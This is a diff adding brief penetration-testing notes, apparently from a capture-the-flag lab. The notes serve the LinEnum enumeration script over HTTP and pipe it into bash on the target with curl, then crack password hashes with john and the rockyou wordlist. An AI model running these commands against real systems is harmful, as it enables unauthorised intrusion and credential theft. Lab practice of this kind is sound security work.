@@ -1,0 +1,8 @@
+cp /root/Desktop/LinEnum/LinEnum.sh www/
+
+python3 -m http.server
+
+on linux machine - curl 10.10.14.60:8000/LinEnum/LinEnum.sh | bash
+
+cracking passwords
+john --wordlist=/root/Desktop/rockyou.txt /root/hash.txt
